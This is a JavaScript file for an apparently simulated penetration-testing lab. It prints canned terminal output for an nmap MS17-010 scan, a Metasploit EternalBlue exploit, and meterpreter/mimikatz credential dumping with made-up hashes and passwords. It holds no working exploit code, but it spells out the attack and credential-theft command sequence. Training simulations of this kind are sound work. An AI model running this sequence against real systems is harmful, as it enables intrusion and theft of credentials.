'use strict';

HANDLERS.push(
  // ── Windows shell extras ──────────────────────────────────────────────────

  // ── EternalBlue vuln scan ─────────────────────────────────────────────────
  {
    id: 'nmap-eb-vuln',
    loadTime: () => jitter(20000, 1500),
    progressOnEnter: true,
    progressFn: (elapsed, total) => {
      const pct = Math.min(99.99, elapsed / total * 100).toFixed(2);
      const elSec = Math.floor(elapsed / 1000);
      const elM = Math.floor(elSec / 60), elS = elSec % 60;
      const remMs = Math.max(0, total - elapsed);
      const remSec = Math.floor(remMs / 1000);
      const remM = Math.floor(remSec / 60), remS2 = remSec % 60;
      const etc = new Date(Date.now() + remMs);
      const etcStr = `${String(etc.getHours()).padStart(2,'0')}:${String(etc.getMinutes()).padStart(2,'0')}`;
      return [
        { t: `Stats: 0:${String(elM).padStart(2,'0')}:${String(elS).padStart(2,'0')} elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan`, cls: 'd' },
        { t: `SYN Stealth Scan Timing: About ${pct}% done; ETC: ${etcStr} (0:${String(remM).padStart(2,'0')}:${String(remS2).padStart(2,'0')} remaining)`, cls: 'd' },
      ];
    },
    match: c => /^nmap\b/.test(c) && c.includes('10.10.10.10') && (c.includes('-sV') || c.includes('--script')),
    lines: [
      { t: () => 'Starting Nmap 7.94 ( https://nmap.org ) at ' + new Date().toUTCString().slice(0,16) },
      { t: 'Nmap scan report for WIN7-PC (10.10.10.10)' },
      { t: 'Host is up (0.0021s latency).' },
      { t: 'Not shown: 997 closed tcp ports (reset)' },
      { t: 'PORT      STATE SERVICE            VERSION' },
      { t: '135/tcp   open  msrpc              Microsoft Windows RPC', cls: 'g' },
      { t: '139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn', cls: 'g' },
      { t: '445/tcp   open  microsoft-ds       Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)', cls: 'r' },
      { t: '3389/tcp  open  ssl/ms-wbt-server  Microsoft Terminal Services', cls: 'y' },
      { t: '' },
      { t: 'Host script results:' },
      { t: '|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s' },
      { t: '| smb-security-mode:' },
      { t: '|   account_used: guest' },
      { t: '|   authentication_level: user' },
      { t: '|   challenge_response: supported' },
      { t: '|_  message_signing: disabled (dangerous, but default)', cls: 'r' },
      { t: '| smb-vuln-ms17-010: ', cls: 'r' },
      { t: '|   VULNERABLE:', cls: 'r' },
      { t: '|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)', cls: 'r' },
      { t: '|     State: VULNERABLE', cls: 'r' },
      { t: '|     IDs:  CVE:CVE-2017-0143', cls: 'r' },
      { t: '|     Risk factor: HIGH', cls: 'r' },
      { t: '|       A critical remote code execution vulnerability exists in Microsoft SMBv1', cls: 'r' },
      { t: '|       servers (ms17-010).', cls: 'r' },
      { t: '|     Disclosure date: 2017-03-14', cls: 'd' },
      { t: '|     References:', cls: 'd' },
      { t: '|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143', cls: 'd' },
      { t: '|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx', cls: 'd' },
      { t: '' },
      { t: 'Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows' },
      { t: '' },
      { t: () => 'Nmap done: 1 IP address (1 host up) scanned in ' + (17.2 + Math.random() * 0.8).toFixed(2) + ' seconds', cls: 'g' },
    ],
  },

  // ── msfconsole ───────────────────────────────────────────────────────────────────────────
  {
    id: 'msfconsole',
    match: c => (c === 'msfconsole' || c === 'msfconsole -q') && !SIM.msf,
    stepLines: [
      { t: '\x1b[90m[*] Starting the Metasploit Framework console...\x1b[0m', delay: 0 },
      { t: '\x1b[90m[*] Checking for updates...\x1b[0m', delay: jitter(400, 100) },
      { t: '\x1b[90m[*] Loading modules...\x1b[0m', delay: jitter(700, 150) },
      { t: '', delay: jitter(900, 200) },
      { t: '\x1b[31m  ██████╗ ███████╗███╗   ███╗██████╗ ██████╗  █████╗ ███╗   ██╗██████╗ ████████╗\x1b[0m', delay: 0 },
      { t: '\x1b[31m  ██╔══██╗██╔════╝████╗ ████║██╔══██╗██╔══██╗██╔══██╗████╗  ██║██╔══██╗╚══██╔══╝\x1b[0m', delay: 0 },
      { t: '\x1b[31m  ██████╔╝█████╗  ██╔████╔██║██████╔╝██████╔╝███████║██╔██╗ ██║██║  ██║   ██║   \x1b[0m', delay: 0 },
      { t: '\x1b[31m  ██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══██╗██╔══██╗██╔══██║██║╚██╗██║██║  ██║   ██║   \x1b[0m', delay: 0 },
      { t: '\x1b[31m  ██║  ██║███████╗██║ ╚═╝ ██║██████╔╝██║  ██║██║  ██║██║ ╚████║██████╔╝   ██║   \x1b[0m', delay: 0 },
      { t: '\x1b[31m  ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   \x1b[0m', delay: 0 },
      { t: '', delay: 0 },
      { t: '\x1b[90m       Exploitation Framework \u2014 because patching is optional, apparently\x1b[0m', delay: 0 },
      { t: '', delay: 0 },
      { t: '\x1b[90m       =[ \x1b[0m\x1b[1;31mmetasploit v6.3.44-dev\x1b[0m\x1b[90m                          ]\x1b[0m', delay: 0 },
      { t: '\x1b[90m+ -- --=[ \x1b[0m2374 exploits - 1232 auxiliary - 413 post\x1b[90m       ]\x1b[0m', delay: 0 },
      { t: '\x1b[90m+ -- --=[ \x1b[0m1171 payloads - 46 encoders - 11 nops\x1b[90m           ]\x1b[0m', delay: 0 },
      { t: '\x1b[90m+ -- --=[ \x1b[0m9 evasion\x1b[90m                                       ]\x1b[0m', delay: 0 },
      { t: '', delay: 0 },
      { t: '\x1b[90m       Metasploit tip: \x1b[0mUse \x1b[33msearch\x1b[0m to find modules by name or CVE', delay: 0 },
      { t: '', delay: jitter(80, 30) },
    ],
    lines: [],
    after: () => {
      SIM.msf = true;
      SIM.msfModule = null;
      SIM.msfOpts['__global__'] = { LHOST: '10.10.10.5' };
    },
  },

  // ── msf: use module ───────────────────────────────────────────────────────
  {
    id: 'msf-use',
    match: c => SIM.msf && /^use\s+\S+/.test(c) && (
      c.includes('ms17_010') ||
      /^use\s+\d+$/.test(c.trim())
    ),
    lines: [{ t: c => {
      let mod = c.replace(/^use\s+/, '').trim();
      // `use <n>` — resolve from last search results
      if (/^\d+$/.test(mod)) {
        const idx = parseInt(mod, 10);
        const resolved = SIM.msfLastSearch[idx];
        if (!resolved) {
          return { openMsf: true, msfEcho: `[-] Failed to load module: ${mod}` };
        }
        mod = resolved;
      }
      SIM.msfModule = mod;
      SIM.msfOpts[mod] = SIM.msfOpts[mod] || {};
      // inherit global LHOST if not already set
      if (!SIM.msfOpts[mod].LHOST && SIM.msfOpts['__global__']?.LHOST) {
        SIM.msfOpts[mod].LHOST = SIM.msfOpts['__global__'].LHOST;
      }
      return { openMsf: true };
    }}],
  },

  // ── msf: set options ──────────────────────────────────────────────────────
  {
    id: 'msf-set',
    match: c => /^set\s+\S+\s+\S+/.test(c) && SIM.msf,
    lines: [{ t: c => {
      const parts = c.split(/\s+/);
      let key = parts[1].toUpperCase();
      const val = parts.slice(2).join(' ');
      // Real msfconsole aliases singular forms onto plural canonical names.
      const ALIASES = { RHOST: 'RHOSTS', LHOSTS: 'LHOST' };
      if (ALIASES[key]) key = ALIASES[key];
      const mod = SIM.msfModule || '__global__';
      if (!SIM.msfOpts[mod]) SIM.msfOpts[mod] = {};
      SIM.msfOpts[mod][key] = val;
      return { openMsf: true, msfEcho: `${key} => ${val}` };
    }}],
  },

  // ── msf: show options (no module loaded) ──────────────────────────────────
  {
    match: c => c === 'show options' && SIM.msf && !SIM.msfModule,
    lines: [{ t: () => ({ openMsf: true, msfEcho:
      '[-] No module selected. Use `use <module>` to load one (e.g. `use exploit/windows/smb/ms17_010_eternalblue`).'
    })}],
  },

  // ── msf: show options ─────────────────────────────────────────────────────
  {
    match: c => c === 'show options' && SIM.msf && SIM.msfModule,
    lines: [{ t: () => {
      const mod = SIM.msfModule;
      const opts = SIM.msfOpts[mod] || {};
      return { openMsf: true, msfEcho:
        `Module options (${mod}):\n\n` +
        `   Name           Current Setting  Required  Description\n` +
        `   ----           ---------------  --------  -----------\n` +
        `   RHOSTS         ${(opts.RHOSTS||'').padEnd(15)}  yes       The target host(s)\n` +
        `   RPORT          445              yes       The target port (TCP)\n` +
        `   LHOST          ${(opts.LHOST||'').padEnd(15)}  yes       The listen address\n` +
        `   LPORT          4444             yes       The listen port\n` +
        `   PAYLOAD        windows/x64/meterpreter/reverse_tcp  yes  The payload`
      };
    }}],
  },

  // ── msf: run / exploit — missing RHOSTS ───────────────────────────────────
  {
    id: 'msf-run-no-rhosts',
    match: c => (c === 'run' || c === 'exploit') && SIM.msf && SIM.msfModule && SIM.msfModule.includes('ms17_010') && !(SIM.msfOpts[SIM.msfModule]?.RHOSTS),
    lines: [{ t: () => ({ openMsf: true, msfEcho:
      `[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.`
    })}],
  },

  // ── msf: run / exploit — wrong RHOSTS (host unreachable) ──────────────────
  {
    id: 'msf-run-wrong-rhosts',
    match: c => (c === 'run' || c === 'exploit') && SIM.msf && SIM.msfModule && SIM.msfModule.includes('ms17_010') && !!(SIM.msfOpts[SIM.msfModule]?.RHOSTS) && SIM.msfOpts[SIM.msfModule].RHOSTS !== '10.10.10.10',
    stepLines: [
      { t: () => `[*] Started reverse TCP handler on ${SIM.msfOpts[SIM.msfModule]?.LHOST || '10.10.10.5'}:4444`, cls: 'b', delay: 0 },
      { t: () => `[*] ${SIM.msfOpts[SIM.msfModule].RHOSTS}:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check`, cls: 'b', delay: jitter(600, 200) },
      { t: () => `[*] ${SIM.msfOpts[SIM.msfModule].RHOSTS}:445 - Connecting to target for exploitation.`, cls: 'b', delay: jitter(900, 300) },
      { t: () => `[-] ${SIM.msfOpts[SIM.msfModule].RHOSTS}:445 - Rex::ConnectionTimeout: The connection timed out (${SIM.msfOpts[SIM.msfModule].RHOSTS}:445).`, cls: 'r', delay: jitter(2200, 600) },
      { t: () => `[-] ${SIM.msfOpts[SIM.msfModule].RHOSTS}:445 - Could not connect to target. Host appears down.`, cls: 'r', delay: jitter(150, 50) },
      { t: () => `[*] ${SIM.msfOpts[SIM.msfModule].RHOSTS}:445 - Scanned 1 of 1 hosts (100% complete)`, cls: 'b', delay: jitter(400, 150) },
      { t: () => `[-] ${SIM.msfOpts[SIM.msfModule].RHOSTS}:445 - Exploit aborted due to failure: unreachable: The target is not responding.`, cls: 'r', delay: jitter(300, 100) },
      { t: '[*] Exploit completed, but no session was created.', cls: 'y', delay: jitter(200, 80) },
      { t: '', delay: jitter(150, 50) },
      { t: '[sim] Hint: the vulnerable Windows 7 box is at 10.10.10.10. Check your RHOSTS.', cls: 'y', delay: jitter(80, 30) },
    ],
    lines: [],
  },

  // ── msf: run / exploit ────────────────────────────────────────────────────
  {
    id: 'msf-run',
    match: c => (c === 'run' || c === 'exploit') && SIM.msf && SIM.msfModule && SIM.msfModule.includes('ms17_010') && SIM.msfOpts[SIM.msfModule]?.RHOSTS === '10.10.10.10',
    stepLines: [
      { t: '[*] Started reverse TCP handler on 10.10.10.5:4444',                          cls: 'b', delay: 0 },

      { t: '[*] 10.10.10.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check',      cls: 'b', delay: jitter(280, 120) },
      { t: '[+] 10.10.10.10:445 - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)', cls: 'g', delay: jitter(10, 5) },
      { t: '[*] 10.10.10.10:445 - Connecting to target for exploitation.',                 cls: 'b', delay: jitter(10, 5) },
      { t: '[+] 10.10.10.10:445 - Connection established for exploitation.',               cls: 'g', delay: jitter(420, 150) },
      { t: '[+] 10.10.10.10:445 - Target OS selected valid for OS indicated by SMB reply', cls: 'g', delay: jitter(10, 5) },
      { t: '[*] 10.10.10.10:445 - Trying exploit with 12 Groom Allocations.',              cls: 'b', delay: jitter(10, 5) },
      { t: '[*] 10.10.10.10:445 - Starting non-paged pool grooming',                       cls: 'b', delay: jitter(10, 5) },
      { t: '[+] 10.10.10.10:445 - Sending SMBv2 buffers',                                  cls: 'g', delay: jitter(220, 80) },
      { t: '[*] 10.10.10.10:445 - Sending final SMBv2 buffers.',                           cls: 'b', delay: jitter(10, 5) },
      { t: '[*] 10.10.10.10:445 - Receiving response from exploit packet',                 cls: 'b', delay: jitter(380, 130) },
      { t: '[+] 10.10.10.10:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!', cls: 'g', delay: jitter(10, 5) },
      { t: '[*] 10.10.10.10:445 - Triggering free of corrupted buffer.',                   cls: 'b', delay: jitter(10, 5) },
      { t: '[*] Sending stage (200774 bytes) to 10.10.10.10',                              cls: 'b', delay: jitter(620, 200) },
      { t: '[*] Meterpreter session 1 opened (10.10.10.5:4444 -> 10.10.10.10:49158)',      cls: 'g', delay: jitter(4000, 400) },
      { t: '',                                                                              delay: jitter(50, 20) },
    ],
    lines: [],
    after: () => {
      SIM.legacyPwned = true; SIM.msfMeter = true; SIM.msfMeterId = 1;
      SIM.msfSessions = [{ id: 1, type: 'meterpreter', host: '10.10.10.10' }];
      window.dispatchEvent(new CustomEvent('hacklet:compromised'));
    },
  },

  // ── msf: getuid / sysinfo ─────────────────────────────────────────────────
  {
    id: 'msf-getuid',
    match: c => (c === 'getuid' || c === 'sysinfo' || c === 'getuid\nsysinfo') && SIM.msfMeter,
    lines: [{ t: c => {
      if (c === 'sysinfo') return { openMsf: true, msfEcho:
        'Computer        : WIN7-PC\n' +
        'OS              : Windows 7 (6.1 Build 7601, Service Pack 1).\n' +
        'Architecture    : x64\n' +
        'System Language : en_US\n' +
        'Domain          : WORKGROUP\n' +
        'Logged On Users : 2\n' +
        'Meterpreter     : x64/windows'
      };
      return { openMsf: true, msfEcho: 'Server username: NT AUTHORITY\\SYSTEM' };
    }}],
  },

  // ── msf: hashdump ─────────────────────────────────────────────────────────
  {
    id: 'msf-hashdump',
    loadTime: () => jitter(1800, 400),
    match: c => c === 'hashdump' && SIM.msfMeter,
    lines: [{ t: () => ({ openMsf: true, msfEcho:
      'Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::' + '\n' +
      'Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::' + '\n' +
      'WIN7-PC$:1000:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::'
    })}],
  },

  // ── msf: load kiwi (mimikatz extension) ──────────────────────────────────
  {
    id: 'msf-load-kiwi',
    match: c => /^load\s+(kiwi|mimikatz)\s*$/i.test(c) && SIM.msfMeter,
    stepLines: [
      { t: 'Loading extension kiwi...',                                                         cls: 'b', delay: jitter(900, 300) },
      { t: '  .#####.   mimikatz 2.2.0 20191125 (x64/windows)',                                 cls: 'd', delay: jitter(450, 150) },
      { t: ' .## ^ ##.  "A La Vie, A L\'Amour" - (oe.eo)',                                      cls: 'd', delay: jitter(20, 10) },
      { t: ' ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )',         cls: 'd', delay: jitter(20, 10) },
      { t: ' ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz',                           cls: 'd', delay: jitter(20, 10) },
      { t: ' \'## v ##\'       Vincent LE TOUX            ( vincent.letoux@gmail.com )',         cls: 'd', delay: jitter(20, 10) },
      { t: '  \'#####\'        > http://pingcastle.com / http://mysmartlogon.com  ***/',        cls: 'd', delay: jitter(20, 10) },
      { t: '',                                                                                          delay: jitter(60, 20) },
      { t: 'Success.',                                                                          cls: 'g', delay: jitter(700, 200) },
    ],
    lines: [],
    after: () => { SIM.kiwiLoaded = true; },
  },

  // ── msf: kiwi creds_all (the iconic plaintext-from-LSASS dump) ───────────
  {
    id: 'msf-kiwi-creds-all',
    match: c => /^creds_all\s*$/i.test(c) && SIM.msfMeter && SIM.kiwiLoaded,
    stepLines: [
      { t: '[!] Not currently running as SYSTEM',                                                cls: 'y', delay: jitter(280, 100) },
      { t: '[*] Attempting to getprivs',                                                         cls: 'b', delay: jitter(280, 100) },
      { t: '[+] Got SeDebugPrivilege',                                                           cls: 'g', delay: jitter(420, 130) },
      { t: '[*] Retrieving all credentials',                                                     cls: 'b', delay: jitter(700, 220) },
      { t: 'msv credentials',                                                                    cls: 'b', delay: jitter(15, 10) },
      { t: '===============',                                                                    cls: 'd', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'Username           Domain    NTLM                              SHA1',                cls: 'b', delay: jitter(15, 10) },
      { t: '--------           ------    ----                              ----',                cls: 'd', delay: jitter(15, 10) },
      { t: 'Administrator      DC01      fc525c9683e8fe067095ba2ddc971889  d2c8eaeae3a6e9e60a64e1eaa5e9d4f7c09a8b2c', cls: 'g', delay: jitter(15, 10) },
      { t: 'Administrator      CORP      9c1d8b5a47e2f6c0d3a8b4e9c1d2f5a8  5a7c9e1f3b5d7e9c1a3b5d7f9e1c3a5b7d9f1c3e', cls: 'g', delay: jitter(15, 10) },
      { t: 'krbtgt             CORP      9f3a8b2c1d4e5f6a7b8c9d0e1f2a3b4c  2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f', cls: 'g', delay: jitter(15, 10) },
      { t: 'it.admin           CORP      a4d3b8e9f1c2d5b7a8e6f9c1d4b2e7a9  7b2c8e9f1a4d6e8b3c5f7a9d2e4b6c8e0f1a3d5e', cls: 'g', delay: jitter(15, 10) },
      { t: 'jane.smith         CORP      6f4d2b8a0c1e3f5b7d9a1c3e5f7b9d1a  3e5b7d9f1a3c5e7b9d1f3a5c7e9b1d3f5a7c9e1b', cls: 'g', delay: jitter(15, 10) },
      { t: 'r.brown            CORP      2c8e4a6f0b1d3e5a7c9f1b3d5e7a9c1f  4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a', cls: 'g', delay: jitter(15, 10) },
      { t: 'helpdesk           CORP      e9b1d3f5a7c9e1b3d5f7a9c1e3b5d7f9a  1a3c5e7b9d1f3a5c7e9b1d3f5a7c9e1b3d5f7a9c',          delay: jitter(15, 10) },
      { t: 'svc_backup         CORP      8c802621d2e36fc074345dded890f3e5  4e6a91b3c8d2f7e0a1b9c4d8e7f5a2b6c3d9e0f1', cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_sql            CORP      d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4  6e8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a', cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_web            CORP      a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8  8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c', cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_iis            CORP      f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0  0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e', cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_exchange       CORP      b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8  2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b', cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_veeam          CORP      d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0  4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d',          delay: jitter(15, 10) },
      { t: 'DC01$              CORP      8c4d4e3a92ad1f0b4e9c8d7a6f5e4d3c  9f1e8d7c6b5a4e3d2c1b0a9f8e7d6c5b4a3f2e1d', cls: 'g', delay: jitter(15, 10) },
      { t: 'WS-FINANCE-01$     CORP      4d6e8a2c4f6b8d0a2c4e6f8b0d2a4c6e  6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a',          delay: jitter(15, 10) },
      { t: 'WS-HR-02$          CORP      6e8a2c4f6b8d0a2c4e6f8b0d2a4c6e8a  8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c',          delay: jitter(15, 10) },
      { t: 'FILESERVER01$      CORP      8a2c4f6b8d0a2c4e6f8b0d2a4c6e8a2c  0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e',          delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'wdigest credentials',                                                                cls: 'b', delay: jitter(15, 10) },
      { t: '===================',                                                                cls: 'd', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'Username           Domain    Password',                                              cls: 'b', delay: jitter(15, 10) },
      { t: '--------           ------    --------',                                              cls: 'd', delay: jitter(15, 10) },
      { t: '(null)             (null)    (null)',                                                         delay: jitter(15, 10) },
      { t: 'DC01$              CORP      (null)',                                                         delay: jitter(15, 10) },
      { t: 'Administrator      DC01      SuperS3cret_Admin!2024',                                cls: 'g', delay: jitter(15, 10) },
      { t: 'Administrator      CORP      D0m41nAdm1n!Winter24',                                  cls: 'g', delay: jitter(15, 10) },
      { t: 'it.admin           CORP      ITadm1n#Winter2024',                                    cls: 'g', delay: jitter(15, 10) },
      { t: 'jane.smith         CORP      Sp4rkles!Forever',                                      cls: 'g', delay: jitter(15, 10) },
      { t: 'r.brown            CORP      Autumn2023!@',                                          cls: 'g', delay: jitter(15, 10) },
      { t: 'helpdesk           CORP      H3lpd3sk!2024',                                                  delay: jitter(15, 10) },
      { t: 'svc_backup         CORP      Backup2024!',                                           cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_sql            CORP      Sql$erver2024!',                                        cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_web            CORP      W3bSvc#2024',                                           cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_iis            CORP      iis_p00l_pw_2024',                                      cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_exchange       CORP      Exch4ng3!Service',                                      cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_veeam          CORP      V33mB4ckup#24',                                                  delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'tspkg credentials',                                                                  cls: 'b', delay: jitter(15, 10) },
      { t: '=================',                                                                  cls: 'd', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'Username           Domain    Password',                                              cls: 'b', delay: jitter(15, 10) },
      { t: '--------           ------    --------',                                              cls: 'd', delay: jitter(15, 10) },
      { t: 'Administrator      DC01      SuperS3cret_Admin!2024',                                cls: 'g', delay: jitter(15, 10) },
      { t: 'Administrator      CORP      D0m41nAdm1n!Winter24',                                  cls: 'g', delay: jitter(15, 10) },
      { t: 'it.admin           CORP      ITadm1n#Winter2024',                                    cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'kerberos credentials',                                                               cls: 'b', delay: jitter(15, 10) },
      { t: '====================',                                                               cls: 'd', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'Username           Domain          Password',                                        cls: 'b', delay: jitter(15, 10) },
      { t: '--------           ------          --------',                                        cls: 'd', delay: jitter(15, 10) },
      { t: '(null)             (null)          (null)',                                                   delay: jitter(15, 10) },
      { t: 'dc01$              CORP.LOCAL      (null)',                                                   delay: jitter(15, 10) },
      { t: 'Administrator      CORP.LOCAL      D0m41nAdm1n!Winter24',                            cls: 'g', delay: jitter(15, 10) },
      { t: 'it.admin           CORP.LOCAL      ITadm1n#Winter2024',                              cls: 'g', delay: jitter(15, 10) },
      { t: 'jane.smith         CORP.LOCAL      Sp4rkles!Forever',                                cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_backup         CORP.LOCAL      Backup2024!',                                     cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_sql            CORP.LOCAL      Sql$erver2024!',                                  cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_web            CORP.LOCAL      W3bSvc#2024',                                     cls: 'g', delay: jitter(15, 10) },
      { t: 'svc_exchange       CORP.LOCAL      Exch4ng3!Service',                                cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(50, 20) },
    ],
    lines: [],
  },

  // ── msf: kiwi creds_all but kiwi not loaded ──────────────────────────────
  {
    match: c => /^creds_all\s*$/i.test(c) && SIM.msfMeter && !SIM.kiwiLoaded,
    lines: [{ t: '[-] Unknown command: creds_all. Did you forget `load kiwi`?', cls: 'r' }],
  },

  // ── msf: kiwi lsa_dump_sam ───────────────────────────────────────────────
  {
    id: 'msf-kiwi-lsa-dump-sam',
    match: c => /^lsa_dump_sam\s*$/i.test(c) && SIM.msfMeter && SIM.kiwiLoaded,
    stepLines: [
      { t: '[+] Running as SYSTEM',                                                              cls: 'g', delay: jitter(400, 150) },
      { t: '[*] Dumping SAM',                                                                    cls: 'b', delay: jitter(950, 280) },
      { t: 'Domain : DC01',                                                                      cls: 'b', delay: jitter(620, 180) },
      { t: 'SysKey : a3f4e2c1b8d97e6f5a4c3b2e1d0f9e8a',                                                   delay: jitter(15, 10) },
      { t: 'Local SID : S-1-5-21-3471439708-2069099870-1234567890',                                       delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(380, 120) },
      { t: 'SAMKey : 8a9b1c2d3e4f5a6b7c8d9e0f1a2b3c4d',                                                   delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(15, 10) },
      { t: 'RID  : 000001f4 (500)',                                                              cls: 'b', delay: jitter(15, 10) },
      { t: 'User : Administrator',                                                                        delay: jitter(15, 10) },
      { t: '  Hash NTLM: fc525c9683e8fe067095ba2ddc971889',                                      cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(280, 90) },
      { t: 'RID  : 000001f5 (501)',                                                              cls: 'b', delay: jitter(15, 10) },
      { t: 'User : Guest',                                                                                delay: jitter(15, 10) },
      { t: '  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0',                                               delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 80) },
      { t: 'RID  : 000001f7 (503)',                                                              cls: 'b', delay: jitter(15, 10) },
      { t: 'User : DefaultAccount',                                                                       delay: jitter(15, 10) },
      { t: '  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0',                                               delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 80) },
      { t: 'RID  : 000001f8 (504)',                                                              cls: 'b', delay: jitter(15, 10) },
      { t: 'User : WDAGUtilityAccount',                                                                   delay: jitter(15, 10) },
      { t: '  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0',                                               delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(280, 90) },
      { t: 'RID  : 000003e9 (1001)',                                                             cls: 'b', delay: jitter(15, 10) },
      { t: 'User : helpdesk_local',                                                                       delay: jitter(15, 10) },
      { t: '  Hash NTLM: a4e3f1c5b8d2e7a9f3c1b5d8e2a4f6c0',                                      cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 80) },
      { t: 'RID  : 000003ea (1002)',                                                             cls: 'b', delay: jitter(15, 10) },
      { t: 'User : sql_admin',                                                                            delay: jitter(15, 10) },
      { t: '  Hash NTLM: c7e1b3d5f7a9c1e3b5d7f9a1c3e5b7d9',                                      cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 80) },
      { t: 'RID  : 000003eb (1003)',                                                             cls: 'b', delay: jitter(15, 10) },
      { t: 'User : backup_local',                                                                         delay: jitter(15, 10) },
      { t: '  Hash NTLM: 9e1f3a5c7e9b1d3f5a7c9e1b3d5f7a9c',                                      cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 80) },
      { t: 'RID  : 000003ec (1004)',                                                             cls: 'b', delay: jitter(15, 10) },
      { t: 'User : monitoring',                                                                           delay: jitter(15, 10) },
      { t: '  Hash NTLM: 3b5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a',                                               delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(220, 80) },
      { t: 'RID  : 000003ed (1005)',                                                             cls: 'b', delay: jitter(15, 10) },
      { t: 'User : tempadmin',                                                                            delay: jitter(15, 10) },
      { t: '  Hash NTLM: 5d7f9a1c3e5b7d9f1a3c5e7b9d1f3a5c',                                      cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(50, 20) },
    ],
    lines: [],
  },

  // ── msf: kiwi lsa_dump_secrets ───────────────────────────────────────────
  {
    id: 'msf-kiwi-lsa-dump-secrets',
    match: c => /^lsa_dump_secrets\s*$/i.test(c) && SIM.msfMeter && SIM.kiwiLoaded,
    stepLines: [
      { t: '[+] Running as SYSTEM',                                                              cls: 'g', delay: jitter(380, 130) },
      { t: '[*] Dumping LSA secrets',                                                            cls: 'b', delay: jitter(1300, 400) },
      { t: 'Domain : DC01',                                                                      cls: 'b', delay: jitter(15, 10) },
      { t: 'SysKey : a3f4e2c1b8d97e6f5a4c3b2e1d0f9e8a',                                                   delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(450, 150) },
      { t: 'Secret  : DefaultPassword',                                                          cls: 'b', delay: jitter(15, 10) },
      { t: 'cur/text: SuperS3cret_Admin!2024',                                                   cls: 'g', delay: jitter(15, 10) },
      { t: '',                                                                                            delay: jitter(280, 90) },
      { t: 'Secret  : $MACHINE.ACC',                                                             cls: 'b', delay: jitter(15, 10) },
